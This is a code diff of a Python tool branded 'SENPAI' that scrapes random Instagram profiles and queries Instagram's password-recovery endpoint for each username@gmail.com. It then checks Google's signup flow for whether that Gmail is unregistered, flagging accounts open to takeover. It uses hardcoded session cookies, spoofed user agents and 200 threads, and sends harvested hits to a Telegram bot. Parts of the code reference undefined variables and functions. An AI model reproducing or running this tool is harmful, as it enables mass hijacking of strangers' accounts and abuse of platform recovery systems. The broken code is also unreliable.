@@ -7,432 +7,399 @@ import random
 import hashlib
 import uuid
 import time
-import threading
 from datetime import datetime
+from threading import Thread
 import requests
 from requests import post as pp
 from user_agent import generate_user_agent
 from random import choice, randrange
-from cfonts import render
+from cfonts import render, say
 from colorama import Fore, Style, init
 import webbrowser
 
+# --- CONFIGURATION (Updated Filters) ---
+MIN_FOLLOWERS = 20 # Minimum Followers set to 20
+MIN_POSTS = 1      # Minimum Posts set to 1
+
+
 init(autoreset=True)
 
+INSTAGRAM_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
+IG_SIG_KEY_VERSION = 'ig_sig_key_version'
+SIGNED_BODY = 'signed_body'
+COOKIE_VALUE = 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj'
+CONTENT_TYPE_HEADER = 'Content-Type'
+COOKIE_HEADER = 'Cookie'
+USER_AGENT_HEADER = 'User-Agent'
+DEFAULT_USER_AGENT = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
+                      'AppleWebKit/537.36 (KHTML, like Gecko) '
+                      'Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0')
 
-EXPIRE_TIME = '2025-11-22 19:59:00'
-EXPIRE_MSG = '   contact @jaorg'
+GOOGLE_ACCOUNTS_URL = 'https://accounts.google.com'
+GOOGLE_ACCOUNTS_DOMAIN = 'accounts.google.com'
+REFERRER_HEADER = 'referer'
+ORIGIN_HEADER = 'origin'
+AUTHORITY_HEADER = 'authority'
+CONTENT_TYPE_FORM = 'application/x-www-form-urlencoded; charset=UTF-8'
+CONTENT_TYPE_FORM_ALT = 'application/x-www-form-urlencoded;charset=UTF-8'
 
-def check_expiration():
-    current_time = datetime.now()
-    expiration_time = datetime.strptime(EXPIRE_TIME, '%Y-%m-%d %H:%M:%S')
-    if current_time > expiration_time:
-        print(EXPIRE_MSG)
-        sys.exit(1)
+TOKEN_FILE = 'tl.txt'
+eizon_domain = '@gmail.com' 
 
-check_expiration()
+P = '\x1b[1;97m'
+B = '\x1b[1;94m'
+O = '\x1b[1;96m'
+Z = '\x1b[1;30m'
+X = '\x1b[1;33m'
+F = '\x1b[2;32m'
+Z = '\x1b[1;31m'
+L = '\x1b[1;95m'
+C = '\x1b[2;35m'
+A = '\x1b[2;39m'
+P = '\x1b[38;5;231m'
+J = '\x1b[38;5;208m'
+J1 = '\x1b[38;5;202m'
+J2 = '\x1b[38;5;203m'
+J21 = '\x1b[38;5;204m'
+J22 = '\x1b[38;5;209m'
+F1 = '\x1b[38;5;76m'
+C1 = '\x1b[38;5;120m'
+P1 = '\x1b[38;5;150m'
+P2 = '\x1b[38;5;190m'
+E = '\033[1;31m'
+Y = '\033[1;33m'
+Z = '\033[1;31m' 
+X = '\033[1;33m' 
+Z1 = '\033[2;31m' 
+F = '\033[2;32m' 
+A = '\033[2;34m'
+C = '\033[2;35m' 
+S = '\033[2;36m'
+G = '\033[1;34m' 
+M = '\x1b[1;37m'
+B = '\x1b[1;37m'
 
+total_hits = 0
+hits = 0
+bad_insta = 0
+bad_email = 0
+good_ig = 0
+infoinsta = {}
 
-NAGI_CONFIG = {
-    "api_endpoint": "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/",
-    "signature_version": "signature_version",
-    "encoded_payload": "encoded_payload",
-    "session_cookie": "mid=YWRmMwABAAFVn7T8J9pLxw3qKd; csrftoken=Ax8Yq2LpNvRcDzWf96BMjiXKLNCVst",
-    "header_content_type": "Content-Type",
-    "header_cookie": "Cookie",
-    "header_user_agent": "User-Agent",
-    "default_ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-    "google_auth_url": "https://accounts.google.com",
-    "google_auth_domain": "accounts.google.com",
-    "header_referer": "referer",
-    "header_origin": "origin",
-    "header_authority": "authority",
-    "content_form_type": "application/x-www-form-urlencoded; charset=UTF-8",
-    "content_form_alt": "application/x-www-form-urlencoded;charset=UTF-8",
-    "auth_token_file": "auth_tokens.txt",
-    "email_suffix": "@gmail.com"
-}
+banner = render('{senpai}', colors=['white', 'blue'], align='center')
+print(f'''
+\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+                      {banner}
+\033[2;36m CHANNEL : @senpai_era| DEV : @jaorg
+\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+''')
 
-
-NAGI_COLORS = {
-    'orange1': '\033[38;5;202m',
-    'orange2': '\033[38;5;203m',
-    'orange3': '\033[38;5;204m',
-    'orange4': '\033[38;5;205m',
-    'orange5': '\033[38;5;206m',
-    'orange6': '\033[38;5;207m',
-    'green': '\x1b[38;5;48m',
-    'white': '\033[38;5;15m',
-    'cyan': '\033[38;5;39m',
-    'pink': '\033[38;5;203m',
-    'bright_green': '\033[38;5;46m',
-    'gray': '\033[38;5;248m',
-    'yellow1': '\033[38;5;226m',
-    'yellow2': '\033[38;5;227m',
-    'yellow3': '\033[38;5;228m',
-    'yellow4': '\033[38;5;229m',
-    'yellow5': '\033[38;5;230m',
-    'yellow6': '\033[38;5;231m'
-}
-
-
-stats = {
-    'total_hits': 0,
-    'hits': 0,
-    'bad_instagram': 0,
-    'bad_email': 0,
-    'good_instagram': 0
-}
-
-
-user_data_cache = {}
-
-
-http_client = requests.Session()
-
-
-print('✦✧✧' * 14)
-nagi = render('SENPAI', font='block', colors=['white', 'blue'], align='center', background='black', space=True)
-print(nagi)
-print("tool by @jaorg | @senpai_era | crdt: @nagipy")
-print('✧✧✦' * 14)
-
-
-TELEGRAM_ID = input(f"\033[1;90m𖤍  \033[1;97mTelegram Id \033[1;90m☞  ")
-BOT_TOKEN = input(f"\033[1;90m𖤍  \033[1;97mBot Token \033[1;90m  ☞ ")
+ID = input('\033[1;33m -  𝐈𝐃 : ')
+print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+TOKEN = input('\033[1;33m - 𝐓𝐨𝐤𝐞𝐧 : ')
 os.system('clear')
 
-def display_statistics():
-    
-    hits_count = stats['hits']
-    bad_count = stats['bad_instagram'] + stats['bad_email']
-    good_count = stats['good_instagram']
 
-    os.system('clear')
-    print(f"{NAGI_COLORS['yellow1']}𖤍 丂𝐞𝐧𝐩𝐚𝐢 ♨︎")
-    print(f"{NAGI_COLORS['yellow1']}• 𝖍𝖎𝖙𝖘     ➸  {NAGI_COLORS['yellow2']}{hits_count}")
-    print(f"{NAGI_COLORS['yellow1']}• 𝖇𝖆𝖉 𝖍𝖎𝖙𝖘     ➸ {NAGI_COLORS['yellow3']}{bad_count}")
-    print(f"{NAGI_COLORS['yellow1']}• 𝖌𝖔𝖔𝖉 𝖎𝖌     ➸ {NAGI_COLORS['yellow4']}{good_count}")
 
-def update_stats_display():
-  
-    display_statistics()
+def update_stats():
+    # @aryan ;
+    sysdontwrite = f"""\r{C1}Hits{P1} : {hits}{J21} |{Z} Bad IG{P} : {J21}{bad_insta}{P} | {Z}Bad Email{B} : {J21}{bad_email}{Z} | {P}Good IG{Z} : {J21}{good_ig}"""
+    sys.stdout.write(sysdontwrite)
+    sys.stdout.flush()
 
-def create_auth_token():
-    
+def Eizon():
     try:
-        chars = 'azertyuiopmlkjhgfdsqwxcvbn'
-        name_segment1 = ''.join(choice(chars) for _ in range(randrange(6, 9)))
-        name_segment2 = ''.join(choice(chars) for _ in range(randrange(3, 9)))
-        session_id = ''.join(choice(chars) for _ in range(randrange(15, 30)))
-        
-        auth_headers = {
+        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
+        n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
+        n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
+        host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
+        headers = {
             'accept': '*/*',
-            'accept-language': 'en-US,en;q=0.9',
-            NAGI_CONFIG["header_content_type"]: NAGI_CONFIG["content_form_alt"],
+            'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
+            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
             'google-accounts-xsrf': '1',
-            NAGI_CONFIG["header_user_agent"]: str(generate_user_agent())
+            USER_AGENT_HEADER: str(generate_user_agent())
         }
+        recovery_url = (f"{GOOGLE_ACCOUNTS_URL}/signin/v2/usernamerecovery"
+                        "?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB")
+        res1 = requests.get(recovery_url, headers=headers)
         
-        recovery_endpoint = f"{NAGI_CONFIG['google_auth_url']}/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-US"
-        response = requests.get(recovery_endpoint, headers=auth_headers)
-        
-        pattern_match = re.search(
+        # Using a more robust regex check
+        match = re.search(
             'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
-            response.text
+            res1.text
         )
-        
-        if pattern_match:
-            auth_token = pattern_match.group(2)
+        if match:
+             tok = match.group(2)
         else:
-            raise Exception("Auth token not found")
-        
-        session_cookies = {'__Host-GAPS': session_id}
-        request_headers = {
-            NAGI_CONFIG["header_authority"]: NAGI_CONFIG["google_auth_domain"],
-            'accept': '*/*',
-            'accept-language': 'en-US,en;q=0.8',
-            NAGI_CONFIG["header_content_type"]: NAGI_CONFIG["content_form_alt"],
-            'google-accounts-xsrf': '1',
-            NAGI_CONFIG["header_origin"]: NAGI_CONFIG["google_auth_url"],
-            NAGI_CONFIG["header_referer"]: 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&NAGI=mn',
-            NAGI_CONFIG["header_user_agent"]: generate_user_agent()
-        }
-        
-        payload = {
-            'f.req': f'["{auth_token}","{name_segment1}","{name_segment2}","{name_segment1}","{name_segment2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
-            'deviceinfo': '[null,null,null,null,null,"US",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'
-        }
-        
-        response = requests.post(f"{NAGI_CONFIG['google_auth_url']}/_/signup/validatepersonaldetails",
-                               cookies=session_cookies, headers=request_headers, data=payload)
-        token_string = str(response.text).split('",null,"')[1].split('"')[0]
-        session_id = response.cookies.get_dict().get('__Host-GAPS', session_id)
-        
-        with open(NAGI_CONFIG["auth_token_file"], 'w') as f:
-            f.write(f"{token_string}//{session_id}\n")
-            
-    except Exception as e:
-        create_auth_token()
+            # Fallback or retry if token extraction fails
+            raise ValueError("Token not found in response.")
 
-
-create_auth_token()
-
-def verify_email_availability(email_address):
-    
-    global tracking_stats
-    try:
-        if '@' in email_address:
-            email_address = email_address.split('@')[0]
-            
-        with open(NAGI_CONFIG["auth_token_file"], 'r') as f:
-            token_info = f.read().splitlines()[0]
-            
-        auth_token, session_id = token_info.split('//')
-        session_cookies = {'__Host-GAPS': session_id}
-        
-        request_headers = {
-            NAGI_CONFIG["header_authority"]: NAGI_CONFIG["google_auth_domain"],
+        cookies = {'__Host-GAPS': host}
+        headers2 = {
+            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
             'accept': '*/*',
             'accept-language': 'en-US,en;q=0.9',
-            NAGI_CONFIG["header_content_type"]: NAGI_CONFIG["content_form_alt"],
+            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
             'google-accounts-xsrf': '1',
-            NAGI_CONFIG["header_origin"]: NAGI_CONFIG["google_auth_url"],
-            NAGI_CONFIG["header_referer"]: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={auth_token}",
-            NAGI_CONFIG["header_user_agent"]: generate_user_agent()
+            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
+            REFERRER_HEADER: ('https://accounts.google.com/signup/v2/createaccount'
+                              '?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn'),
+            USER_AGENT_HEADER: generate_user_agent()
         }
-        
-        query_params = {'TL': auth_token}
-        payload_data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&NAGI=mn"
-                f"&f.req=%5B%22TL%3A{auth_token}%22%2C%22{email_address}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
+        data = {
+            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
+            'deviceinfo': ('[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,'
+                           'null,0,1,"",null,null,2,2]')
+        }
+        response = requests.post(f"{GOOGLE_ACCOUNTS_URL}/_/signup/validatepersonaldetails",
+                                 cookies=cookies, headers=headers2, data=data)
+        token_line = str(response.text).split('",null,"')[1].split('"')[0]
+        host = response.cookies.get_dict()['__Host-GAPS']
+        with open(TOKEN_FILE, 'w') as f:
+            f.write(f"{token_line}//{host}\n")
+    except Exception as e:
+        Eizon()
+
+Eizon()
+
+def check_gmail(email):
+    global bad_email, hits
+    try:
+        if '@' in email:
+            email = email.split('@')[0]
+        with open(TOKEN_FILE, 'r') as f:
+            token_data = f.read().splitlines()[0]
+        tl, host = token_data.split('//')
+        cookies = {'__Host-GAPS': host}
+        headers = {
+            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
+            'google-accounts-xsrf': '1',
+            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
+            REFERRER_HEADER: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
+            USER_AGENT_HEADER: generate_user_agent()
+        }
+        params = {'TL': tl}
+        data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
+                f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                 "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
-                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22US%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
+                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                 "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                 "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
-        
-        response = pp(f"{NAGI_CONFIG['google_auth_url']}/_/signup/usernameavailability",
-                    params=query_params, cookies=session_cookies, headers=request_headers, data=payload_data)
-        
+        response = pp(f"{GOOGLE_ACCOUNTS_URL}/_/signup/usernameavailability",
+                      params=params, cookies=cookies, headers=headers, data=data)
         if '"gf.uar",1' in response.text:
-            tracking_stats['valid_accounts'] += 1
-            update_stats_display()
-            full_email = email_address + NAGI_CONFIG["email_suffix"]
-            save_user_info(email_address, full_email.split('@')[1])
+            hits += 1
+            update_stats()
+            full_email = email + eizon_domain
+            username, domain = full_email.split('@')
+            InfoAcc(username, domain)
         else:
-            tracking_stats['invalid_email'] += 1
-            update_stats_display()
-            
-    except Exception as e:
+            bad_email += 1
+            update_stats()
+    except Exception:
         pass
 
-def check_instagram_profile(email_address):
-    
-    global tracking_stats
-    user_agent_string = generate_user_agent()
-    device_id_string = 'android-' + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
-    unique_id_string = str(uuid.uuid4())
-    
-    request_headers = {
-        NAGI_CONFIG["header_user_agent"]: user_agent_string,
-        NAGI_CONFIG["header_cookie"]: NAGI_CONFIG["session_cookie"],
-        NAGI_CONFIG["header_content_type"]: NAGI_CONFIG["content_form_type"]
+def check(email):
+    global good_ig, bad_insta
+    ua = generate_user_agent()
+    dev = 'android-'
+    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
+    uui = str(uuid.uuid4())
+    headers = {
+        USER_AGENT_HEADER: ua,
+        COOKIE_HEADER: COOKIE_VALUE,
+        CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM
     }
-    
-    payload_data = {
-        NAGI_CONFIG["encoded_payload"]: (
-            '7f3a8c1e5d2b9a4f6c8e0d3b5a9c2f1e.' +
-            json.dumps({
-                '_csrftoken': 'Ax8Yq2LpNvRcDzWf96BMjiXKLNCVst',
-                'adid': unique_id_string,
-                'guid': unique_id_string,
-                'device_id': device_id_string,
-                'query': email_address
-            })
-        ),
-        NAGI_CONFIG["signature_version"]: '5'
+    data = {
+        SIGNED_BODY: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
+                      json.dumps({
+                          '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
+                          'adid': uui,
+                          'guid': uui,
+                          'device_id': device_id,
+                          'query': email
+                      })),
+        IG_SIG_KEY_VERSION: '4'
     }
+    response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).text
     
-    response = http_client.post(NAGI_CONFIG["api_endpoint"], headers=request_headers, data=payload_data).text
-    
-    if email_address in response:
-        if NAGI_CONFIG["email_suffix"] in email_address:
-            verify_email_availability(email_address)
-        tracking_stats['active_ig'] += 1
-        update_stats_display()
+    # Instagram recovery check
+    if email in response:
+        good_ig += 1
+        update_stats()
+        # If Instagram account exists, now check if the Gmail is available
+        if eizon_domain in email:
+            check_gmail(email)
     else:
-        tracking_stats['invalid_ig'] += 1
-        update_stats_display()
+        bad_insta += 1
+        update_stats()
 
-def get_password_reset_info(username):
-
+def rest(user):
     try:
-        request_headers = {
-            'X-Pigeon-Session-Id': '88dd1923-45ab-78cd-90ef-a1b2c3d4e5f6',
-            'X-Pigeon-Rawclienttime': '1701252674.125',
-            'X-IG-Connection-Speed': '2500kbps',
-            'X-IG-Bandwidth-Speed-KBPS': '1250.500',
-            'X-IG-Bandwidth-TotalBytes-B': '1024',
-            'X-IG-Bandwidth-TotalTime-MS': '500',
-            'X-Bloks-Version-Id': 'd90e7f6c5b4a3c2d1e8f9a0b7c6d5e4f',
+        headers = {
+            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
+            'X-Pigeon-Rawclienttime': '1700251574.982',
+            'X-IG-Connection-Speed': '-1kbps',
+            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
+            'X-IG-Bandwidth-TotalBytes-B': '0',
+            'X-IG-Bandwidth-TotalTime-MS': '0',
+            'X-Bloks-Version-Id': ('c80c5fb30dfae9e273e4009f03b18280'
+                                   'bb343b0862d663f31a3c63f13a9f31c0'),
             'X-IG-Connection-Type': 'WIFI',
-            'X-IG-Capabilities': '4brTvw8=',
+            'X-IG-Capabilities': '3brTvw==',
             'X-IG-App-ID': '567067343352427',
-            NAGI_CONFIG["header_user_agent"]: 'Instagram 210.0.0.25.120 Android (31/12; 480dpi; 1080x2400; samsung; SM-G998B; y20s; snapdragon885; en_US; 364856214)',
-            'Accept-Language': 'en-US, en-GB',
-            NAGI_CONFIG["header_cookie"]: NAGI_CONFIG["session_cookie"],
-            NAGI_CONFIG["header_content_type"]: NAGI_CONFIG["content_form_type"],
-            'Accept-Encoding': 'gzip, deflate, br',
+            USER_AGENT_HEADER: ('Instagram 100.0.0.17.129 Android (29/10; 420dpi; '
+                                '1080x2129; samsung; SM-M205F; m20lte; exynos7904; '
+                                'en_GB; 161478664)'),
+            'Accept-Language': 'en-GB, en-US',
+            COOKIE_HEADER: COOKIE_VALUE,
+            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM,
+            'Accept-Encoding': 'gzip, deflate',
             'Host': 'i.instagram.com',
             'X-FB-HTTP-Engine': 'Liger',
             'Connection': 'keep-alive',
-            'Content-Length': '420'
+            'Content-Length': '356'
         }
-        
-        payload_data = {
-            NAGI_CONFIG["encoded_payload"]: (
-                '7f3a8c1e5d2b9a4f6c8e0d3b5a9c2f1e.' +
-                '{"_csrftoken":"Ax8Yq2LpNvRcDzWf96BMjiXKLNCVst",'
-                '"adid":"a1b2c3d4-5678-90ef-ghij-k1l2m3n4o5p6",'
-                '"guid":"b2c3d4e5-6789-01fg-hijk-l3m4n5o6p7q8",'
-                '"device_id":"android-a1b2c3d4e5f67890",'
-                '"query":"' + username + '"}'
-            ),
-            NAGI_CONFIG["signature_version"]: '5'
+        data = {
+            SIGNED_BODY: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.'
+                          '{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",'
+                          '"adid":"0dfaf820-2748-4634-9365-c3d8c8011256",'
+                          '"guid":"1f784431-2663-4db9-b624-86bd9ce1d084",'
+                          '"device_id":"android-b93ddb37e983481c",'
+                          '"query":"' + user + '"}'),
+            IG_SIG_KEY_VERSION: '4'
         }
-        
-        response = http_client.post(NAGI_CONFIG["api_endpoint"], headers=request_headers, data=payload_data).json()
-        return response.get('email', 'no reset available')
-        
-    except Exception as e:
-        return 'no reset available'
-
-def save_user_info(username, domain):
-    
-    global tracking_stats
-    user_info = user_data_cache.get(username, {})
-    user_id_value = user_info.get('pk', 0)
-    
-    try:
-        user_id_int = int(user_id_value)
+        response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).json()
+        eizonporno = response.get('email', 'Reset None')
     except:
-        user_id_int = 0
+        eizonporno = 'Reset None'
+    return eizonporno
 
-    
-    if 1 < user_id_int <= 1278889:
-        creation_year = 2010
-    elif 1279000 <= user_id_int <= 17750000:
-        creation_year = 2011
-    elif 17750001 <= user_id_int <= 279760000:
-        creation_year = 2012
-    elif 279760001 <= user_id_int <= 900990000:
-        creation_year = 2013
-    elif 900990001 <= user_id_int <= 1629010000:
-        creation_year = 2014
-    elif 1629010001 <= user_id_int <= 2369359761:
-        creation_year = 2015
-    elif 2369359762 <= user_id_int <= 4239516754:
-        creation_year = 2016
-    elif 4239516755 <= user_id_int <= 6345108209:
-        creation_year = 2017
-    elif 6345108210 <= user_id_int <= 10016232395:
-        creation_year = 2018
-    elif 10016232396 <= user_id_int <= 27238602159:
-        creation_year = 2019
-    elif 27238602160 <= user_id_int <= 43464475395:
-        creation_year = 2020
-    elif 43464475396 <= user_id_int <= 50289297647:
-        creation_year = 2021
-    elif 50289297648 <= user_id_int <= 57464707082:
-        creation_year = 2022
-    elif 57464707083 <= user_id_int <= 63313426938:
-        creation_year = 2023
-    else:
-        creation_year = "2024 or 2025"
-
-    follower_count = user_info.get('follower_count', 0)
+def date(hy):
+    """Calculates registration year based on Instagram user ID range."""
     try:
-        follower_count = int(follower_count)
+        hy = int(hy)
     except:
-        follower_count = 0
+        return 'N/A'
         
-    if follower_count < 0:
+    ranges = [
+        (1279000, 2010),
+        (17750000, 2011),
+        (279760000, 2012),
+        (900990000, 2013),
+        (1629010000, 2014),
+        (2500000000, 2015),
+        (3713668786, 2016),
+        (5699785217, 2017),
+        (8597939245, 2018),
+        (21254029834, 2019),
+        (43464475395, 2020),
+        (50289297647, 2021),
+        (57464707082, 2022),
+        (63313426938, 2023),
+    ]
+    
+    for upper, year in sorted(ranges):
+        if hy <= upper:
+            return year
+    return "2024+"
+
+def InfoAcc(username, domain):
+    global total_hits, MIN_FOLLOWERS, MIN_POSTS, ID, TOKEN
+    account_info = infoinsta.get(username, {})
+    
+    # --- Data Extraction and Validation ---
+    user_id = account_info.get('pk', 'N/A')
+    followers = account_info.get('follower_count', 0)
+    posts = account_info.get('media_count', 0)
+    
+    # 💥 APPLY FOLLOWERS AND POSTS FILTER HERE 💥
+    try:
+        # Check if the account meets the minimum followers and posts criteria
+        if int(followers) < MIN_FOLLOWERS or int(posts) < MIN_POSTS:
+            return # Hit discard if filters are not met
+    except:
         return
 
-    following_count = user_info.get('following_count', '')
-    tracking_stats['total_found'] += 1
+    # --- Data Formatting ---
+    total_hits += 1
+    full_name = account_info.get('full_name', 'N/A')
+    following = account_info.get('following_count', 'N/A')
+    bio = account_info.get('biography', 'No bio')
+    reg_date = date(user_id)
+    reset_email = rest(username)
     
-   
-    result_output = f"""
-█▀▀ SENPAI 👑⚡ ▀▀█
-╔═════════════ 💜 𝐒𝐄𝐍𝐏𝐀𝐈 𝐄𝐑𝐀 💜 ═════════════╗
+    info_text = f"""
+╭━─━─━─━─━─━─━─━─━─━─━─━─━╮
+┃      ⚔️ 𝐒 𝐄 𝐍 𝐏 𝐀 𝐈   𝐄 𝐑 𝐀 ⚔️      ┃
+╰━─━─━─━─━─━─━─━─━─━─━─━─━╯
+╺─────────────────────────────────────╸
 
-  🔥 𝐇𝐈𝐓𝐒          : {stats['total_hits']}
-  👤 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄     : {username}
-  📩 𝐄𝐌𝐀𝐈𝐋         : {username}@{domain}
-  👥 𝐅𝐎𝐋𝐋𝐎𝐖𝐄𝐑𝐒    : {followers}
-  👣 𝐅𝐎𝐋𝐋𝐎𝐖𝐈𝐍𝐆    : {following}
-  🗓️ 𝐘𝐄𝐀𝐑          : {reg_date}
-  📝 𝐁𝐈𝐎           : {account_info.get('biography','')}
-  🔑 𝐑𝐄𝐒𝐄𝐓 𝐋𝐈𝐍𝐊   : {get_reset_link_info(username)}
-  🔗 𝐈𝐆 𝐋𝐈𝐍𝐊       : www.instagram.com/{username}
+ ⭐ 𝗛𝗜𝗧𝗦           | {stats[total_hits]}
+ ─────────────────────────────────────
+ 👾 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘        | [ {username} ]
+ 📧 𝗘𝗠𝗔𝗜𝗟          | [ {username}@{domain} ]
+ 👥 𝗙𝗢𝗟𝗟𝗢𝗪𝗘𝗥𝗦       | [ {followers} ]
+ 🚶 𝗙𝗢𝗟𝗟𝗢𝗪𝗜𝗡𝗚        |[ {following} ]
+ 🗓️ 𝗬𝗘𝗔𝗥           |[ {reg_date} ]
+ 📝 𝗕𝗜𝗢            |[ {bio} ]
+ 🔑 𝗥𝗘𝗦𝗘𝗧 𝗟𝗜𝗡𝗞      |[ {reset_email} ]
+ 🌐 𝗜𝗚 𝗟𝗜𝗡𝗞         | [ www.instagram.com/{username} ]
 
-╚══════════════════════════════════════════════╝
-  ⚔️ 𝐂𝐎𝐃𝐄𝐃 𝐁𝐘 @jaorg • 𝐓𝐄𝐀𝐌 @senpai_era ⚔️
-█▄▄ SENPAI 👑⚡ ▄▄█
+╺─────────────────────────────────────╸
+   ©️ 𝖣𝖤𝖵𝖫𝖮𝖯𝖤𝖱 : @senpai_era | 𝖳𝖤𝖠𝖬 : @senpai_era
 """
-    
-    
-    with open('nagi_results.txt', 'a') as f:
-        f.write(result_output + "\n")
-    
-    
+    with open('senpai.txt', 'a') as f:
+        f.write(info_text + "\n")
     try:
-        requests.get(f"https://api.telegram.org/bot{BOT_API_KEY}/sendMessage?chat_id={TELEGRAM_USER}&text={result_output}")
-    except Exception as e:
+        # Send Telegram message
+        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
+                     params={'chat_id': ID, 'text': info_text, 'parse_mode': 'HTML'})
+    except Exception:
         pass
 
-def nagipy():
-    
+def eizon_python():
     while True:
-        payload = {
-            'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=36)),
+        data = {
+            'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
             'variables': json.dumps({
-                'id': int(random.randrange(1629010000, 2369359761)),
-                'render_surface': 'PROFILE_VIEW'
+                # Random ID generation range
+                'id': int(random.randrange(900990000, 50289297647)),
+                'render_surface': 'PROFILE'
             }),
-            'doc_id': '35628372952261951'
+            'doc_id': '25618261841150840'
         }
-        
-        headers = {'X-FB-LSD': payload['lsd']}
-        
+        headers = {'X-FB-LSD': data['lsd']}
         try:
-            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=payload)
-            user_data = response.json().get('data', {}).get('user', {})
-            username_found = user_data.get('username')
+            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
+            account = response.json().get('data', {}).get('user', {})
+            username = account.get('username')
             
-            if username_found:
-                follower_count = user_data.get('follower_count', 0)
-                if follower_count < 20:
-                    continue
-                    
-                user_data_cache[username_found] = user_data
-                email_address = username_found + NAGI_CONFIG["email_suffix"]
-                check_instagram_profile(email_address)
+            if username:
+                # Store full account info right after fetching
+                infoinsta[username] = account
                 
-        except Exception as e:
+                # Check for minimum posts/followers before doing the expensive email check
+                followers = account.get('follower_count', 0)
+                posts = account.get('media_count', 0)
+                
+                if int(followers) >= MIN_FOLLOWERS and int(posts) >= MIN_POSTS:
+                    emails = [username + eizon_domain]
+                    for email in emails:
+                        # This check function performs the Instagram recovery check
+                        # and then calls check_gmail/InfoAcc if successful.
+                        check(email) 
+                        
+        except Exception:
             pass
 
-def stats_update_loop():
+# Rerunning Eizon to ensure the token is fresh with the new logic
+Eizon()
+
+for _ in range(200):
+    Thread(target=eizon_python).start()
     
-    while True:
-        update_stats_display()
-        time.sleep(1)
-
-
